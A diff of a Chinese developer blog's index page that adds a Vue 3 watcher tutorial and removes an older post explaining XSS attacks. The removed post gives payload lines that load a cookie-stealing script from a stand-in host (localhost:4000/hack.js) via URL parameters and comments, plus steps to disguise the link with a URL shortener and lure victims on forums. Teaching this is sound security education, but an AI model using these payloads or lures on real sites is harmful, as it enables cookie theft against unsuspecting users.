@@ -156,6 +156,146 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2025/04/25/Vue3%E4%BE%A6%E5%90%AC%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Will Wan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Will's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/25/Vue3%E4%BE%A6%E5%90%AC%E5%99%A8/" class="post-title-link" itemprop="url">Vue3侦听器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-04-25 15:37:41 / 修改时间：17:31:16" itemprop="dateCreated datePublished" datetime="2025-04-25T15:37:41+08:00">2025-04-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vue/" itemprop="url" rel="index"><span itemprop="name">vue</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在组合式 API 中，可以使用 watch 函数在每次响应式状态发生变化时触发回调函数。</p>
+<h2 id="侦听数据源类型"><a href="#侦听数据源类型" class="headerlink" title="侦听数据源类型"></a>侦听数据源类型</h2><p>watch 的第一个参数可以是不同形式的“数据源”：它可以是一个 ref (包括计算属性)、一个响应式对象、一个 getter 函数、或多个数据源组成的数组：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = ref(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">const</span> y = ref(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单个 ref</span></span><br><span class="line">watch(x, (newX) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`x is <span class="subst">$&#123;newX&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// getter 函数</span></span><br><span class="line">watch(</span><br><span class="line">  () =&gt; x.value + y.value,</span><br><span class="line">  (sum) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`sum of x + y is: <span class="subst">$&#123;sum&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个来源组成的数组</span></span><br><span class="line">watch([x, () =&gt; y.value], ([newX, newY]) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`x is <span class="subst">$&#123;newX&#125;</span> and y is <span class="subst">$&#123;newY&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，你不能直接侦听响应式对象的属性值，需要用一个返回该属性的 getter 函数</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = reactive(&#123; <span class="attr">count</span>: <span class="number">0</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误，因为 watch() 得到的参数是一个 number</span></span><br><span class="line">watch(obj.count, (count) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Count is: <span class="subst">$&#123;count&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供一个 getter 函数</span></span><br><span class="line">watch(</span><br><span class="line">  () =&gt; obj.count,</span><br><span class="line">  (count) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Count is: <span class="subst">$&#123;count&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="深层侦听器"><a href="#深层侦听器" class="headerlink" title="深层侦听器"></a>深层侦听器</h2><p>直接给 watch() 传入一个响应式对象，会隐式地创建一个深层侦听器——该回调函数在所有嵌套的变更时都会被触发：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = reactive(&#123; <span class="attr">count</span>: <span class="number">0</span> &#125;)</span><br><span class="line"></span><br><span class="line">watch(obj, (newValue, oldValue) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 在嵌套的属性变更时触发</span></span><br><span class="line">  <span class="comment">// 注意：`newValue` 此处和 `oldValue` 是相等的</span></span><br><span class="line">  <span class="comment">// 因为它们是同一个对象！</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">obj.count++</span><br></pre></td></tr></table></figure>
+
+<p>监听一个返回响应式对象的 getter 函数，只有在返回不同的对象时，才会触发回调：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watch(</span><br><span class="line">  () =&gt; state.someObject,</span><br><span class="line">  () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 仅当 state.someObject 被替换时触发</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>也可以给上面这个例子显式地加上 <code>deep</code> 选项，强制转成深层侦听器：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watch(</span><br><span class="line">  () =&gt; state.someObject,</span><br><span class="line">  (newValue, oldValue) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 注意：`newValue` 此处和 `oldValue` 是相等的</span></span><br><span class="line">    <span class="comment">// *除非* state.someObject 被整个替换了</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; <span class="attr">deep</span>: <span class="literal">true</span> &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>在 Vue 3.5+ 中，deep 选项还可以是一个数字，表示最大遍历深度。</p>
+<h2 id="即时回调的侦听器"><a href="#即时回调的侦听器" class="headerlink" title="即时回调的侦听器"></a>即时回调的侦听器</h2><p>watch 默认是懒执行的：仅当数据源变化时，才会执行回调。可以通过传入 <code>immediate: true</code> 选项来强制侦听器的回调立即执行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">watch(</span><br><span class="line">  source,</span><br><span class="line">  (newValue, oldValue) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 立即执行，且当 `source` 改变时再次执行</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; <span class="attr">immediate</span>: <span class="literal">true</span> &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="一次性侦听器"><a href="#一次性侦听器" class="headerlink" title="一次性侦听器"></a>一次性侦听器</h2><p>如果希望回调只在源变化时触发一次，请使用 <code>once: true</code> 选项。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">watch(</span><br><span class="line">  source,</span><br><span class="line">  (newValue, oldValue) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 当 `source` 变化时，仅触发一次</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; <span class="attr">once</span>: <span class="literal">true</span> &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h2 id="watchEffect"><a href="#watchEffect" class="headerlink" title="watchEffect()"></a>watchEffect()</h2><p><code>watchEffect</code> 和 <code>watch</code> 都能响应式地执行有副作用的回调。</p>
+<p>例如下面的代码，在每当 todoId 的引用发生变化时使用侦听器来加载一个远程资源：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todoId = ref(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">const</span> data = ref(<span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">watch(</span><br><span class="line">  todoId,</span><br><span class="line">  <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(</span><br><span class="line">      <span class="string">`https://jsonplaceholder.typicode.com/todos/<span class="subst">$&#123;todoId.value&#125;</span>`</span></span><br><span class="line">    )</span><br><span class="line">    data.value = <span class="keyword">await</span> response.json()</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; <span class="attr">immediate</span>: <span class="literal">true</span> &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>像上面例子中这样如果侦听器的回调中使用与源完全相同的响应式状态，就可以用 watchEffect 函数 来简化上面的代码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">watchEffect(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(</span><br><span class="line">    <span class="string">`https://jsonplaceholder.typicode.com/todos/<span class="subst">$&#123;todoId.value&#125;</span>`</span></span><br><span class="line">  )</span><br><span class="line">  data.value = <span class="keyword">await</span> response.json()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="watch-vs-watchEffect"><a href="#watch-vs-watchEffect" class="headerlink" title="watch vs. watchEffect"></a>watch vs. watchEffect</h3><p>watch 和 watchEffect 之间的主要区别是追踪响应式依赖的方式：</p>
+<ul>
+<li><p>watch 只追踪明确侦听的数据源。它不会追踪任何在回调中访问到的东西。另外，仅在数据源确实改变时才会触发回调。watch 会避免在发生副作用时追踪依赖，因此，我们能更加精确地控制回调函数的触发时机。</p>
+</li>
+<li><p>watchEffect，则会在副作用发生期间追踪依赖。它会在同步执行过程中，自动追踪所有能访问到的响应式属性。这更方便，而且代码往往更简洁，但有时其响应性依赖关系会不那么明确。</p>
+</li>
+</ul>
+<h2 id="副作用清理"><a href="#副作用清理" class="headerlink" title="副作用清理"></a>副作用清理</h2><p>当我们可能会在侦听器中执行副作用时，例如异步请求，如果在请求完成之前监听的数据源发生了变化，当上一个请求完成时，它仍会使用已经过时的数据源值触发回调。理想情况下，我们希望能够在数据源变为新值时取消过时的请求。</p>
+<ol>
+<li>可以使用<code>onWatcherCleanup()</code> API 来注册一个清理函数清理副作用：</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; watch, onWatcherCleanup &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line">watch(id, (newId) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> controller = <span class="keyword">new</span> AbortController()</span><br><span class="line"></span><br><span class="line">  fetch(<span class="string">`/api/<span class="subst">$&#123;newId&#125;</span>`</span>, &#123; <span class="attr">signal</span>: controller.signal &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 回调逻辑</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  onWatcherCleanup(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 终止过期请求</span></span><br><span class="line">    controller.abort()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，onWatcherCleanup 仅在 Vue 3.5+ 中支持，并且必须在 watchEffect 效果函数或 watch 回调函数的同步执行期间调用：你不能在异步函数的 await 语句之后调用它。</strong></p>
+<ol start="2">
+<li>在 Vue 3.5 之前的版本，可以使用 onCleanup 函数清理副作用。</li>
+</ol>
+<p>onCleanup 函数需要作为第三个参数传递给侦听器 watch 的回调函数，或 watchEffect 回调函数的第一个参数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">watch(id, (newId, oldId, onCleanup) =&gt; &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  onCleanup(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 清理逻辑</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">watchEffect(<span class="function">(<span class="params">onCleanup</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  onCleanup(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 清理逻辑</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>通过函数参数传递的 onCleanup 与侦听器实例相绑定，因此不受 onWatcherCleanup 的同步限制。</p>
+<h2 id="侦听器回调的触发时机"><a href="#侦听器回调的触发时机" class="headerlink" title="侦听器回调的触发时机"></a>侦听器回调的触发时机</h2><p>类似于组件更新，侦听器回调函数也会被批量处理以避免重复调用。默认情况下，<strong>侦听器回调会在父组件更新 (如有) 之后、所属组件的 DOM 更新之前被调用</strong>。</p>
+<p>如果想在侦听器回调中能访问被 Vue 更新之后的所属组件的 DOM，需要指明 flush: ‘post’ 选项：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">watch(source, callback, &#123;</span><br><span class="line">  flush: <span class="string">'post'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">watchEffect(callback, &#123;</span><br><span class="line">  flush: <span class="string">'post'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="后置侦听器-watchPostEffect"><a href="#后置侦听器-watchPostEffect" class="headerlink" title="后置侦听器 watchPostEffect()"></a>后置侦听器 watchPostEffect()</h3><p>后置刷新的 watchEffect() 有个更方便的别名 watchPostEffect()：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; watchPostEffect &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line">watchPostEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">/* 在 Vue 更新后执行 */</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="同步侦听器"><a href="#同步侦听器" class="headerlink" title="同步侦听器"></a>同步侦听器</h3><p>还可以创建一个同步触发的侦听器，它会在 Vue 进行任何更新之前触发：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">watch(source, callback, &#123;</span><br><span class="line">  flush: <span class="string">'sync'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">watchEffect(callback, &#123;</span><br><span class="line">  flush: <span class="string">'sync'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>同步触发的 watchEffect() 也有个更方便的别名 watchSyncEffect()：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; watchSyncEffect &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line">watchSyncEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">/* 在响应式数据变化时同步执行 */</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>同步侦听器不会进行批处理，每当检测到响应式数据发生变化时就会触发。可以使用它来监视简单的布尔值，但应避免在可能多次同步修改的数据源 (如数组) 上使用。</strong></p>
+<h2 id="停止侦听器"><a href="#停止侦听器" class="headerlink" title="停止侦听器"></a>停止侦听器</h2><p>在 setup() 或 <code>&lt;script setup&gt;</code> 中用同步语句创建的侦听器，会自动绑定到宿主组件实例上，并且会在宿主组件卸载时自动停止。</p>
+<p>侦听器必须用同步语句创建：如果用异步回调创建一个侦听器，那么它不会绑定到当前组件上，必须手动停止它，以防内存泄漏。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; watchEffect &#125; <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 它会自动停止</span></span><br><span class="line">watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...这个则不会！</span></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">&#125;, <span class="number">100</span>)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要手动停止一个侦听器，请调用 watch 或 watchEffect 返回的函数：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unwatch = watchEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...当该侦听器不再需要时</span></span><br><span class="line">unwatch()</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意，需要异步创建侦听器的情况很少，请尽可能选择同步创建。</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2025/04/24/Vue3%E5%93%8D%E5%BA%94%E5%BC%8F%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1304,242 +1444,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/08/XSS%E6%94%BB%E5%87%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="Will Wan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Will's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/08/XSS%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">XSS 攻击</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-02-08 09:34:35" itemprop="dateCreated datePublished" datetime="2022-02-08T09:34:35+08:00">2022-02-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-02 12:07:12" itemprop="dateModified" datetime="2022-08-02T12:07:12+08:00">2022-08-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-XSS-攻击"><a href="#1-XSS-攻击" class="headerlink" title="1. XSS 攻击"></a>1. XSS 攻击</h1><p>XSS，全称Cross-Site Scripting，跨站脚本攻击，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可以获得用户的敏感信息，如：cookie等，进而危害数据安全。</p>
-<p>XSS攻击的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
-<p>XSS攻击可能造成的危害：</p>
-<ul>
-<li>窃取Cookie或者本，发送恶意请求</li>
-<li>在网页插入恶意内容</li>
-<li>获取网站和用户个人信息</li>
-<li>其他利用用js脚本能造成的危害</li>
-</ul>
-<h2 id="XSS攻击分类"><a href="#XSS攻击分类" class="headerlink" title="XSS攻击分类"></a>XSS攻击分类</h2><p>根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。</p>
-<table>
-<thead>
-<tr>
-<th>类型</th>
-<th>存储区</th>
-<th>插入点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>反射型XSS</td>
-<td>URL</td>
-<td>HTML</td>
-</tr>
-<tr>
-<td>存储型XSS</td>
-<td>后端数据库</td>
-<td>HTML</td>
-</tr>
-<tr>
-<td>DOM型XSS</td>
-<td>后端数据库/前端存储/URL</td>
-<td>前端JavaScript</td>
-</tr>
-</tbody></table>
-<h3 id="反射型XSS（url参数直接注入）"><a href="#反射型XSS（url参数直接注入）" class="headerlink" title="反射型XSS（url参数直接注入）"></a>反射型XSS（url参数直接注入）</h3><p>实现攻击步骤：</p>
-<ol>
-<li>alert尝试（看该网站是否有 XSS 漏洞）</li>
-<li>构造攻击url</li>
-<li>短域名伪造（通过短域名生成网站把上面构造的 XSS 攻击url转换成看似正常的url）</li>
-<li>把构造好的url放到贴吧、论坛或微博等网站，加上诱惑性的语言描述，吸引用户点击（这一步很关键，因为只有用户点击了该url链接，才可能造成攻击）</li>
-<li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li>
-<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
-</ol>
-<p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p>
-<p>例如：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常url</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=china</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构造攻击url：hack.js实现获取Cookie</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?from=&lt;script src="http://localhost:4000/hack.js"&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 短域名伪造：通过百度短网址网站（https://dwz.cn/）缩短url </span></span><br><span class="line"><span class="comment">// 4. 把构造好的url放到贴吧</span></span><br><span class="line"><span class="comment">// 5. 用户打开带有恶意代码的 URL</span></span><br><span class="line"><span class="comment">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="存储型-XSS-存储到数据库后读取时攻击"><a href="#存储型-XSS-存储到数据库后读取时攻击" class="headerlink" title="存储型 XSS - 存储到数据库后读取时攻击"></a>存储型 XSS - 存储到数据库后读取时攻击</h3><p>实现攻击步骤：</p>
-<ol>
-<li>alert尝试（看该网站是否有 XSS 漏洞）</li>
-<li>构造攻击脚本</li>
-<li>把攻击脚本注入网站数据库</li>
-<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li>
-<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
-</ol>
-<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
-<p><strong>反射型 XSS 跟存储型 XSS 的区别是：</strong>存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</p>
-<p>例如：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 1. alert尝试</span></span><br><span class="line"><span class="comment">// 在有评论功能的网站发送如下评论，如果能弹出alert提示说明存在漏洞</span></span><br><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 2. 构造攻击脚本：hack.js实现获取Cookie</span></span><br><span class="line"><span class="regexp">我来了&lt;script src="http:/</span><span class="regexp">/localhost:4000/</span>hack.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 3. 把攻击脚本注入网站数据库：通过发评论实现</span></span><br><span class="line"><span class="string">// 4. 用户访问该网页</span></span><br><span class="line"><span class="string">// 后续步骤...</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>实现攻击步骤：</p>
-<ul>
-<li>攻击者构造出特殊的 URL，其中包含恶意代码（恶意代码也可以存储在数据库或前端存储）。</li>
-<li>用户打开带有恶意代码的 URL。</li>
-<li>用户浏览器接收到响应后解析执行，<strong>前端 JavaScript 取出 URL 中的恶意代码并执行</strong>。</li>
-<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
-</ul>
